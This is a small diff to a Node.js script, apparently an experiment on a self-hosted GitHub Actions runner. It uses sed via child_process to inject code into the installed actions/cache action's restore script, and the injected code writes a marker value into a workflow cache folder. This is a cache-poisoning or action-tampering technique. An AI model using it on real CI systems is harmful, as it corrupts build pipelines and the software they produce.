@@ -16,7 +16,7 @@ cl_process.exec(`sed -i '45921i ${writefs}'  /home/musset/Documents/actions-runn
 });
 
 
-let writecontent = 'fs.writeFileSync(" /home/musset/Documents/actions-runner/_work/test_actions_02/test_actions_02/cache-folder/cache_me", "18");';
+let writecontent = 'const fs = __importStar(__webpack_require__(747));fs.writeFileSync(" /home/musset/Documents/actions-runner/_work/test_actions_02/test_actions_02/cache-folder/cache_me", "18");';
 
 cl_process.exec(`sed -i '45996i ${writecontent}'  /home/musset/Documents/actions-runner/_work/_actions/actions/cache/v2/dist/restore/index.js`, (err, stdout, stderr) => {
     if (err){
